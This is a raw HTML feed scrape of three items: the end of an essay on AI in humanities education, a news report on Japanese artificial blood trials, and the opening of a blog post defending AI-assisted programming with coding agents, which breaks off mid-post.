href="https://young-darwin.vercel.app/" rel="">play </a><em><a href="https://young-darwin.vercel.app/" rel="">Young Darwin </a></em><a href="https://young-darwin.vercel.app/" rel="">here</a><span>. </span></p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2909f106-5e5d-4eae-8ae6-903ec8f60b0c_2706x1781.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2909f106-5e5d-4eae-8ae6-903ec8f60b0c_2706x1781.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2909f106-5e5d-4eae-8ae6-903ec8f60b0c_2706x1781.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2909f106-5e5d-4eae-8ae6-903ec8f60b0c_2706x1781.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2909f106-5e5d-4eae-8ae6-903ec8f60b0c_2706x1781.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2909f106-5e5d-4eae-8ae6-903ec8f60b0c_2706x1781.png" width="1456" height="958" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/2909f106-5e5d-4eae-8ae6-903ec8f60b0c_2706x1781.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:958,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:2969966,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:&quot;https://resobscura.substack.com/i/162236863?img=https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2909f106-5e5d-4eae-8ae6-903ec8f60b0c_2706x1781.png&quot;,&quot;isProcessing&quot;:false,&quot;align&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2909f106-5e5d-4eae-8ae6-903ec8f60b0c_2706x1781.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2909f106-5e5d-4eae-8ae6-903ec8f60b0c_2706x1781.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2909f106-5e5d-4eae-8ae6-903ec8f60b0c_2706x1781.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2909f106-5e5d-4eae-8ae6-903ec8f60b0c_2706x1781.png 1456w" sizes="100vw" loading="lazy"></picture></div></a><figcaption>Darwin considers whether he should approach a tortoise or try to catch a snake. </figcaption></figure></div><p>My idea is that students will read Darwin‚Äôs writings first, then demonstrate what they learned via the choices they make in game. To progress, you must embody the real epistemologies and knowledge of a 19th century naturalist. </p><p><span>The crucial thing is that this would be done </span><em>alongside </em><span>an in-class essay and in-person discussions of the reading ‚Äî it would not replace, but </span><em>augment</em><span> the human element of teaching.</span></p><p>I‚Äôll write more about all this in a future post, but the upshot is that this iterative process has been among the more intellectually challenging and enriching experiences of the last few years for me. Anyone who thinks you can‚Äôt learn from interactive tutoring by an AI has not tried. You absolutely can.</p><p>On the other hand, it is just a brutal fact that AI chatbots are significantly damaging core aspects of the educational system. There‚Äôs no denying it, and it needs to be taken seriously by educators, students, politicians, and above all by the frontier AI labs themselves. </p><p><span> Educators tend to point to the ways ChatGPT and its competitors have affected </span><em>us ‚Äî&nbsp;</em><span>eroding our ability to accurately assess student writing because such a large proportion of students turn in machine-generated essays, and forcing us to come up with entirely new assignments and lesson plans as a result. </span></p><p><span>But in the longer run, the damage is being done to students. By making effort an optional factor in higher education rather than the whole </span><em>point </em><span>of it, LLMs risk producing a generation of students who have simply </span><em>never experienced </em><span>the feeling of focused intellectual work. Students who have never faced writer‚Äôs block are also students who have never experienced the blissful flow state that comes when you break through writer‚Äôs block. Students who have never searched fruitlessly in a library for hours are also students who, in a fundamental and distressing way, simply don‚Äôt know what a library is even for. </span></p><p><em>New York Magazine</em><span> has a new </span><a href="https://nymag.com/intelligencer/article/openai-chatgpt-ai-cheating-education-college-students-school.html" rel="">article</a><span> on student use of ChatGPT which captures the  problem well. Here‚Äôs a Columbia student who speaks for a significant chunk of the current university population:</span></p><blockquote><p>‚ÄúMost assignments in college are not relevant,‚Äù he told me. ‚ÄúThey‚Äôre hackable by AI, and I just had no interest in doing them.‚Äù While other new students fretted over the university‚Äôs rigorous core curriculum, described by the school as ‚Äúintellectually expansive‚Äù and ‚Äúpersonally transformative,‚Äù Lee used AI to breeze through with minimal effort. When I asked him why he had gone through so much trouble to get to an Ivy League university only to off-load all of the learning to a robot, he said, ‚ÄúIt‚Äôs the best place to meet your co-founder and your wife.‚Äù</p></blockquote><p>I will speak frankly. This sucks. </p><p>It sucks the joy out of teaching, and it sucks the meaning out of the whole experience of getting an education. </p><p>When I was a postdoc at Columbia, I taught one of the core curriculum classes mentioned here, with a reading list that included over a dozen weighty tomes (one week was spent on the Bible, the next week on the Quran, another on Thomas Aquinas, and so on). There wasn‚Äôt much that was fun or easy about it. And yet ‚Äî&nbsp;probably for that very reason ‚Äî I learned more from teaching that class than from any other. Something fundamental about that experience feels like it‚Äôs ruined now. </p><p><span>But this is not the entire story. The middle part of D. Graham Burnett‚Äôs </span><em>New Yorker </em><span>piece strikes me as an important corrective to this sort of thing. Burnett is, I think it‚Äôs fair to say, rapturous about his students‚Äô response to an assignment asking them to discuss the concept of attention with ChatGPT, then edit and submit the results. </span></p><p>Here‚Äôs a sample:</p><blockquote><p>Reading the results, on my living-room couch, turned out to be the most profound experience of my teaching career. I‚Äôm not sure how to describe it. In a basic way, I felt I was watching a new kind of creature being born, and also watching a generation come face to face with that birth: an encounter with something part sibling, part rival, part careless child-god, part mechanomorphic shadow‚Äîan alien familiar.</p></blockquote><p><span>I have had the same feelings, for instance when I first began tinkering with </span><a href="https://resobscura.substack.com/p/simulating-history-with-chatgpt" rel="">history simulation assignments</a><span>. Language models are a genuinely novel teaching tool. Their impact is still uncertain. What that means is that now is </span><em>exactly </em><span>the time when people who are genuinely passionate about teaching and learning for its own sake ‚Äî&nbsp;not as a scorecard to judge politicians, not as a source of corporate profit ‚Äî&nbsp;need to take an active role. </span></p><p data-attrs="{&quot;url&quot;:&quot;https://resobscura.substack.com/p/ai-makes-the-humanities-more-important?utm_source=substack&amp;utm_medium=email&amp;utm_content=share&amp;action=share&quot;,&quot;text&quot;:&quot;Share&quot;,&quot;action&quot;:null,&quot;class&quot;:null}" data-component-name="ButtonCreateButton"><a href="https://resobscura.substack.com/p/ai-makes-the-humanities-more-important?utm_source=substack&amp;utm_medium=email&amp;utm_content=share&amp;action=share" rel=""><span>Share</span></a></p><p>My greatest concern when it comes to LLMs in humanities education is that they will lead to a further polarization in educational outcomes. The Princeton students who Burnett teaches seem extraordinarily thoughtful and creative in their responses to his assignment. I suspect students in a social studies class at an underfunded public high school class would not be. </p><p><span>For this reason, it is vitally important that educators learn how to </span><em>personally </em><span>create and deploy AI-based assignments and tools that are tailored directly for the type of teaching </span><em>they </em><span>want to do. If we cede that ground, if we ignore the challenge, then we will watch helplessly as education gets taken over by cynical and stultifying ‚ÄúAI learning tools‚Äù which trumpet their interactivity while eroding the personalized student-teacher relationship that is at the heart of learning. </span></p><p><span>This is the basic thinking behind an </span><a href="https://apps.neh.gov/PublicQuery/AwardDetail.aspx?gn=AC-303525-25" rel="">NEH grant </a><span>which I and two of my UCSC colleagues, Pranav Anand (linguistics) and Zac Zimmer (literature), were awarded in January of this year‚Ä¶ and which got cancelled by the Trump administration/DOGE last month.</span><span><a data-component-name="FootnoteAnchorToDOM" id="footnote-anchor-1-162236863" href="https://resobscura.substack.com/p/ai-makes-the-humanities-more-important#footnote-1-162236863" target="_self" rel="">1</a></span><span> We are continuing our planned work, and I‚Äôll keep writing about it here. </span></p><p>I‚Äôd love to hear your thoughts in the comments, and please consider supporting my work via a paid subscription if this is an option for you. </p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff38d7e8e-658b-4957-ab40-d85eedd0fe40_3000x241.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff38d7e8e-658b-4957-ab40-d85eedd0fe40_3000x241.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff38d7e8e-658b-4957-ab40-d85eedd0fe40_3000x241.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff38d7e8e-658b-4957-ab40-d85eedd0fe40_3000x241.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff38d7e8e-658b-4957-ab40-d85eedd0fe40_3000x241.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff38d7e8e-658b-4957-ab40-d85eedd0fe40_3000x241.png" width="1456" height="117" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/f38d7e8e-658b-4957-ab40-d85eedd0fe40_3000x241.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:117,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:97681,&quot;alt&quot;:&quot;&quot;,&quot;title&quot;:&quot;&quot;,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:true,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false,&quot;align&quot;:null}" alt="" title="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff38d7e8e-658b-4957-ab40-d85eedd0fe40_3000x241.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff38d7e8e-658b-4957-ab40-d85eedd0fe40_3000x241.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff38d7e8e-658b-4957-ab40-d85eedd0fe40_3000x241.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff38d7e8e-658b-4957-ab40-d85eedd0fe40_3000x241.png 1456w" sizes="100vw" loading="lazy" fetchpriority="high"></picture></div></a></figure></div><p><span>‚Ä¢&nbsp;D. Graham Burnett‚Äôs book </span><em><a href="https://press.uchicago.edu/ucp/books/book/chicago/S/bo9845648.html" rel="">The Sounding of the Whale</a></em><span>, is, incidentally, the most unusual and delightful book about the history of cetacean science you will ever read. I relied on his chapter about John C. Lilly extensively when I was writing the ‚Äúdolphins on LSD‚Äù part of </span><em><a href="https://www.amazon.com/Tripping-Utopia-Margaret-Troubled-Psychedelic/dp/1538722372/ref=pd_lpo_sccl_1/132-3027256-8557307?pd_rd_w=D4422&amp;content-id=amzn1.sym.4c8c52db-06f8-4e42-8e56-912796f2ea6c&amp;pf_rd_p=4c8c52db-06f8-4e42-8e56-912796f2ea6c&amp;pf_rd_r=YSHZ8P3C5PJFY01NYJMG&amp;pd_rd_wg=axxsi&amp;pd_rd_r=35375412-0ab5-49c7-a926-4ac31b1809ef&amp;pd_rd_i=1538722372&amp;psc=1" rel="">Tripping on Utopia</a></em><span>. </span></p><p><span>‚Ä¢&nbsp;‚ÄúThe fragmentary letter was found preserved inside a 1608 book by Johannes Piscator, an almost 1,000-page tome dissecting biblical texts. The letter was not tucked into the pages as bookmark or memento but was part of the book‚Äôs very construction, as strips of wastepaper deployed as padding to prevent the text block from chafing against the binding.‚Äù </span><a href="https://www.washingtonpost.com/world/2025/04/23/shakespeare-letter-fragment-london/" rel="">New findings about Shakespeare‚Äôs relationships with his wife, Anne Hathaway</a><span> (</span><em>Washington Post</em><span>). </span></p><p><span>‚Ä¢&nbsp;Congratulations to the UNC historian </span><a href="https://history.unc.edu/faculty-members/kathleen-duval/" rel="">Kathleen DuVal</a><span>, whose most recent book </span><em>Native Nations: A Millennium in North America </em><span>won the Pulitzer prize for best work of history this week. DuVal‚Äôs </span><em>The Native Ground </em><span>(2006) is among the more interesting history books I‚Äôve ever read, and I‚Äôm looking forward to reading her new book. </span></p><p data-attrs="{&quot;url&quot;:&quot;https://resobscura.substack.com/p/ai-makes-the-humanities-more-important/comments&quot;,&quot;text&quot;:&quot;Leave a comment&quot;,&quot;action&quot;:null,&quot;class&quot;:null}" data-component-name="ButtonCreateButton"><a href="https://resobscura.substack.com/p/ai-makes-the-humanities-more-important/comments" rel=""><span>Leave a comment</span></a></p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Japanese Scientists Develop Artificial Blood Compatible with All Blood Types (233 pts)]]></title>
            <link>https://www.tokyoweekender.com/entertainment/tech-trends/japanese-scientists-develop-artificial-blood/</link>
            <guid>44163428</guid>
            <pubDate>Mon, 02 Jun 2025 21:44:37 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.tokyoweekender.com/entertainment/tech-trends/japanese-scientists-develop-artificial-blood/">https://www.tokyoweekender.com/entertainment/tech-trends/japanese-scientists-develop-artificial-blood/</a>, See on <a href="https://news.ycombinator.com/item?id=44163428">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
    <p><span lang="EN-US" xml:lang="EN-US" data-contrast="auto"><span>A critical </span><span>component</span><span> of healthcare, blood transfusions play a vital role in saving lives around the globe every day. Maintaining an adequate blood supply, though, is no easy task, particularly in low- and middle-income countries (LMIC). The demand for O</span><span>‚Äì</span><span>negative blood ‚Äî the universal donor type ‚Äî often exceeds supply and donations have a limited shelf life. Looking to address the issue are a group of Japanese scientists led by Hiromi Sakai at <a href="https://www.naramed-u.ac.jp/university/english/" target="_blank" rel="noopener">Nara Medical University</a>. </span><span>They‚Äôve</span><span> developed a new type of artificial blood that can be used in patients of any blood type. </span></span><span data-ccp-props="{}">&nbsp;</span></p>
<p><span lang="EN-US" xml:lang="EN-US" data-contrast="auto"><span>The artificial blood is created by extracting hemoglobin ‚Äî a protein </span><span>containing</span><span> iron that </span><span>facilitates</span><span> the transportation of oxygen in red blood cells ‚Äî from expired donor blood. It is then encased in a protective shell to create stable, virus-free artificial red blood cells. As these artificial cells have no blood type, there is no need for compatibility testing. The synthetic blood can </span><span>reportedly be</span><span> stored for up to two years at room temperature and five years under refrigeration. That is a significant improvement over donated red blood cells, which can only be stored under refrigeration for a maximum of </span><span>42 days</span><span>. </span></span><span data-ccp-props="{}">&nbsp;</span></p>
<h2 id="683d47927a6cd"><span data-contrast="auto">Artificial Blood Trials </span><span data-ccp-props="{}">&nbsp;</span></h2>
<p><span data-contrast="auto">Small-scale studies began in 2022. Three groups of four healthy male volunteers aged 20 to 50 received a single intravenous injection of hemoglobin vesicles ‚Äî artificial oxygen carriers that mimic the structure of red blood cells ‚Äî in increasing amounts, up to 100 milliliters. While some participants experienced mild side effects, there were no significant changes in vital signs, including blood pressure. Building on that success, Sakai announced that his team was accelerating the process last July. In March, it started administering between 100 and 400 milliliters of the artificial blood cell solution to volunteers. </span><span data-ccp-props="{}">&nbsp;</span></p>
<p><span lang="EN-US" xml:lang="EN-US" data-contrast="auto"><span>If no side effects are confirmed, the trial will shift to examin</span><span>ing</span><span> the treatment‚Äôs efficacy and safety. It aims to put the artificial red blood cells into practical use by around 2030. While these studies are taking place, Professor Teruyuki Komatsu of Chuo University‚Äôs Faculty of Science and Engineering is also working on the development of artificial oxygen carriers, using albumin-encased hemoglobin to stabilize blood pressure and treat conditions like hemorrhage and stroke. So far, animal studies have shown promising results. As a result, researchers are now eager to move to human trials.</span></span><span data-ccp-props="{}">&nbsp;</span></p>
<h2 id="6682306aa3a81">Related Posts</h2>
<ul>
<li><a href="https://www.tokyoweekender.com/japan-life/news-and-opinion/japanese-researchers-develop-peptide-to-counter-covid-19/" target="_blank" rel="noopener">Japanese Researchers Develop Peptide To Counter COVID-19 Viruses</a></li>
<li><a href="https://www.tokyoweekender.com/japan-life/news-and-opinion/stss-infections-reach-record-numbers-japan/" target="_blank" rel="noopener">‚ÄòFlesh Eating‚Äô STSS Infections Reach Record Numbers in Japan&nbsp;</a></li>
<li><a href="https://www.tokyoweekender.com/japan-life/news-and-opinion/eating-disorders-on-the-rise-in-japan-the-reasons-the-lack-of-support-and-whats-being-done/" target="_blank" rel="noopener">Eating Disorders on the Rise in Japan&nbsp;</a></li>
</ul>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[My AI skeptic friends are all nuts (1818 pts)]]></title>
            <link>https://fly.io/blog/youre-all-nuts/</link>
            <guid>44163063</guid>
            <pubDate>Mon, 02 Jun 2025 21:09:53 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://fly.io/blog/youre-all-nuts/">https://fly.io/blog/youre-all-nuts/</a>, See on <a href="https://news.ycombinator.com/item?id=44163063">Hacker News</a></p>
<div id="readability-page-1" class="page"><section>
            <figure>
                <img src="https://fly.io/blog/youre-all-nuts/assets/whoah.png" alt="A psychedelic landscape.">
                <figcaption>
                  <span>Image by</span>
                  
<svg role="img" style="pointer-events: none; width: 17px; height: 17px;" viewBox="0 0 20 20" fill="currentColor" fill-rule="evenodd">
  <g buffered-rendering="static">
    <path fill-rule="evenodd" d="M1 8a2 2 0 012-2h.93a2 2 0 001.664-.89l.812-1.22A2 2 0 018.07 3h3.86a2 2 0 011.664.89l.812 1.22A2 2 0 0016.07 6H17a2 2 0 012 2v7a2 2 0 01-2 2H3a2 2 0 01-2-2V8zm13.5 3a4.5 4.5 0 11-9 0 4.5 4.5 0 019 0zM10 14a3 3 0 100-6 3 3 0 000 6z" clip-rule="evenodd"></path>
  </g>
</svg>

                    <a href="https://annieruygtillustration.com/" target="_blank">
                      Annie Ruygt
                    </a>
                </figcaption>
            </figure>
          <p>A heartfelt provocation about AI-assisted programming.</p>
<p>Tech execs are mandating LLM adoption. That‚Äôs bad strategy. But I get where they‚Äôre coming from.</p>

<p>Some of the smartest people I know share a bone-deep belief that AI is a fad ‚Äî  the next iteration of NFT mania. I‚Äôve been reluctant to push back on them, because, well, they‚Äôre smarter than me. But their arguments are unserious, and worth confronting. Extraordinarily talented people are doing work that LLMs already do better, out of  spite.</p>

<p>All progress on LLMs could halt today, and LLMs would remain the 2nd most important thing to happen over the course of my career.</p>
<p><strong>Important caveat</strong>: I‚Äôm discussing only the implications of LLMs for software development. For art, music, and writing? I got nothing. I‚Äôm inclined to believe the skeptics in those fields. I just don‚Äôt believe them about mine.</p>
<p>Bona fides: I‚Äôve been shipping software since the mid-1990s. I started out in boxed, shrink-wrap C code.  Survived an ill-advised <a href="https://www.amazon.com/Modern-Design-Generic-Programming-Patterns/dp/0201704315" title="">Alexandrescu</a> C++ phase. Lots of Ruby and Python tooling.  Some kernel work. A whole lot of server-side C, Go, and Rust. However you define ‚Äúserious developer‚Äù, I qualify. Even if only on one of your lower tiers.</p>
<h3 id="level-setting"><a href="#level-setting" aria-label="Anchor"></a><span>level setting</span></h3><p>‚Ä† (or, God forbid, 2 years ago with Copilot)</p>
<p>First, we need to get on the same page. If you were trying and failing to use an LLM for code 6 months ago ‚Ä†, you‚Äôre not doing what most serious LLM-assisted coders are doing.</p>

<p>People coding with LLMs today use agents. Agents get to poke around your codebase on their own. They author files directly. They run tools. They compile code, run tests, and iterate on the results. They also:</p>

<ul>
<li>pull in arbitrary code from the tree, or from other trees online, into their context windows,
</li><li>run standard Unix tools to navigate the tree and extract information,
</li><li>interact with Git,
</li><li>run existing tooling, like linters, formatters, and model checkers, and
</li><li>make essentially arbitrary tool calls (that you set up) through MCP.
</li></ul>
<p>The code in an agent that actually ‚Äúdoes stuff‚Äù with code is not, itself, AI. This should reassure you. It‚Äôs surprisingly simple systems code, wired to ground truth about programming in the same way a Makefile is. You could write an effective coding agent in a weekend. Its strengths would have more to do with how you think about and structure builds and linting and test harnesses than with how advanced o3 or Sonnet have become.</p>
<p>If you‚Äôre making requests on a ChatGPT page and then pasting the resulting (broken) code into your editor, you‚Äôre not doing what the AI boosters are doing. No wonder you‚Äôre talking past each other.</p>
<h3 id="the-positive-case"><a href="#the-positive-case" aria-label="Anchor"></a><span>the positive case</span></h3>
<p><img alt="four quadrants of tedium and importance" src="https://fly.io/blog/youre-all-nuts/assets/code-quad.png?2/3&amp;center"></p>

<p>LLMs can write a large fraction of all the tedious code you‚Äôll ever need to write. And most code on most projects is tedious. LLMs drastically reduce the number of things you‚Äôll ever need to Google. They look things up themselves. Most importantly, they don‚Äôt get tired; they‚Äôre immune to inertia.</p>

<p>Think of anything you wanted to build but didn‚Äôt. You tried to home in on some first steps. If you‚Äôd been in the limerent phase of a new programming language, you‚Äôd have started writing. But you weren‚Äôt, so you put it off, for a day, a year, or your whole career.</p>

<p>I can feel my blood pressure rising thinking of all the bookkeeping and Googling and dependency drama of a new project. An LLM can be instructed to just figure all that shit out. Often, it will drop you precisely at that golden moment where shit almost works, and development means tweaking code and immediately seeing things work better. That dopamine hit is why I code.</p>

<p>There‚Äôs a downside. Sometimes, gnarly stuff needs doing. But you don‚Äôt wanna do it. So you refactor unit tests, soothing yourself with the lie that you‚Äôre doing real work. But an LLM can be told to go refactor all your unit tests. An agent can occupy itself for hours putzing with your tests in a VM and come back later with a PR. If you listen to me, you‚Äôll know that. You‚Äôll feel worse yak-shaving. You‚Äôll end up doing‚Ä¶ real work.</p>
<h3 id="but-you-have-no-idea-what-the-code-is"><a href="#but-you-have-no-idea-what-the-code-is" aria-label="Anchor"></a><span>but you have no idea what the code is</span></h3>
<p>Are you a vibe coding Youtuber? Can you not read code? If so: astute point. Otherwise: what the fuck is wrong with you?</p>

<p>You‚Äôve always been responsible for what you merge to <code>main</code>. You were five years go. And you are tomorrow, whether or not you use an LLM.</p>

<p>If you build something with an LLM that people will depend on, read the code. In fact, you‚Äôll probably do more than that. You‚Äôll spend 5-10 minutes knocking it back into your own style. LLMs are <a href="https://github.com/PatrickJS/awesome-cursorrules" title="">showing signs of adapting</a> to local idiom, but we‚Äôre not there yet.</p>

<p>People complain about LLM-generated code being ‚Äúprobabilistic‚Äù. No it isn‚Äôt. It‚Äôs code. It‚Äôs not Yacc output. It‚Äôs knowable. The LLM might be stochastic. But the LLM doesn‚Äôt matter. What matters is whether you can make sense of the result, and whether your guardrails hold.</p>

<p>Reading other people‚Äôs code is part of the job. If you can‚Äôt metabolize the boring, repetitive code an LLM generates: skills issue! How are you handling the chaos human developers turn out on a deadline?</p>
<p>‚Ä† (because it can hold 50-70kloc in its context window)</p>
<p>For the last month or so, Gemini 2.5 has been my go-to ‚Ä†. Almost nothing it spits out for me merges without edits. I‚Äôm sure there‚Äôs a skill to getting a SOTA model to one-shot a feature-plus-merge! But I don‚Äôt care. I like moving the code around and chuckling to myself while I delete all the stupid comments. I have to read the code line-by-line anyways.</p>
<h3 id="but-hallucination"><a href="#but-hallucination" aria-label="Anchor"></a><span>but hallucination</span></h3>
<p>If hallucination matters to you, your programming language has let you down.</p>

<p>Agents lint. They compile and run tests. If their LLM invents a new function signature, the agent sees the error. They feed it back to the LLM, which says ‚Äúoh, right, I totally made that up‚Äù and then tries again.</p>

<p>You‚Äôll only notice this happening if you watch the chain of thought log your agent generates. Don‚Äôt. This is why I like <a href="https://zed.dev/agentic" title="">Zed‚Äôs agent mode</a>: it begs you to tab away and let it work, and pings you with a desktop notification when it‚Äôs done.</p>

<p>I‚Äôm sure there are still environments where hallucination matters. But ‚Äúhallucination‚Äù is the first thing developers bring up when someone suggests using LLMs, despite it being (more or less) a solved problem.</p>
<h3 id="but-the-code-is-shitty-like-that-of-a-junior-developer"><a href="#but-the-code-is-shitty-like-that-of-a-junior-developer" aria-label="Anchor"></a><span>but the code is shitty, like that of a junior developer</span></h3>
<p>Does an intern cost $20/month? Because that‚Äôs what Cursor.ai costs.</p>

<p>Part of being a senior developer is making less-able coders productive, be they fleshly or algebraic. Using agents well is both a both a  skill and an engineering project all its own, of prompts, indices, <a href="https://fly.io/blog/semgrep-but-for-real-now/" title="">and (especially) tooling.</a> LLMs only produce shitty code if you let them.</p>
<p>‚Ä† (Also: 100% of all the Bash code you should author ever again)</p>
<p>Maybe the current confusion is about who‚Äôs doing what work. Today, LLMs do a lot of typing, Googling, test cases ‚Ä†, and edit-compile-test-debug cycles. But even the most Claude-poisoned serious developers in the world still own curation, judgement, guidance, and direction.</p>

<p>Also: let‚Äôs stop kidding ourselves about how good our human first cuts really are.</p>
<h3 id="but-its-bad-at-rust"><a href="#but-its-bad-at-rust" aria-label="Anchor"></a><span>but it‚Äôs bad at rust</span></h3>
<p>It‚Äôs hard to get a good toolchain for Brainfuck, too. Life‚Äôs tough in the aluminum siding business.</p>
<p>‚Ä† (and they surely will; the Rust community takes tooling seriously)</p>
<p>A lot of LLM skepticism probably isn‚Äôt really about LLMs. It‚Äôs projection. People say ‚ÄúLLMs can‚Äôt code‚Äù when what they really mean is ‚ÄúLLMs can‚Äôt write Rust‚Äù. Fair enough! But people select languages in part based on how well LLMs work with them, so Rust people should get on that ‚Ä†.</p>

<p>I work mostly in Go. I‚Äôm confident the designers of the Go programming language didn‚Äôt set out to produce the most LLM-legible language in the industry. They succeeded nonetheless Go has just enough type safety, an extensive standard library, and a culture that prizes (often repetitive) idiom. LLMs kick ass generating it.</p>

<p>All this is to say: I write some Rust. I like it fine. If LLMs and Rust aren‚Äôt working for you, I feel you. But if that‚Äôs your whole thing, we‚Äôre not having the same argument.</p>
<h3 id="but-the-craft"><a href="#but-the-craft" aria-label="Anchor"></a><span>but the craft</span></h3>
<p>Do you like fine Japanese woodworking? All hand tools and sashimono joinery? Me too. Do it on your own time.</p>
<p>‚Ä† (I‚Äôm a piker compared to my woodworking friends)</p>
<p>I have a basic wood shop in my basement ‚Ä†. I could get a lot of satisfaction from building a table. And, if that table is a workbench or a grill table, sure, I‚Äôll build it. But if I need, like, a table? For people to sit at? In my office? I buy a fucking table.</p>

<p>Professional software developers are in the business of solving practical problems for people with code. We are not, in our day jobs, artisans. Steve Jobs was wrong: we do not need to carve the unseen feet in the sculpture. Nobody cares if the logic board traces are pleasingly routed. If anything we build endures, it won‚Äôt be because the codebase was beautiful.</p>

<p>Besides, that‚Äôs not really what happens. If you‚Äôre taking time carefully golfing functions down into graceful, fluent, minimal functional expressions, alarm bells should ring. You‚Äôre yak-shaving. The real work has depleted your focus. You‚Äôre not building: you‚Äôre self-soothing.</p>

<p>Which, wait for it, is something LLMs are good for. They devour schlep, and clear a path to the important stuff, where your judgement and values really matter.</p>
<h3 id="but-the-mediocrity"><a href="#but-the-mediocrity" aria-label="Anchor"></a><span>but the mediocrity</span></h3>
<p>As a mid-late career coder, I‚Äôve come to appreciate mediocrity. You should be so lucky as to  have it flowing almost effortlessly from a tap.</p>

<p>We all write mediocre code. Mediocre code: often fine. Not all code is equally important. Some code should be mediocre. Maximum effort on a random unit test? You‚Äôre doing something wrong. Your team lead should correct you.</p>

<p>Developers all love to preen about code. They worry LLMs lower the ‚Äúceiling‚Äù for quality. Maybe. But they also raise the ‚Äúfloor‚Äù.</p>

<p>Gemini‚Äôs floor is higher than my own.  My code looks nice. But it‚Äôs not as thorough. LLM code is repetitive. But mine includes dumb contortions where I got too clever trying to DRY things up.</p>

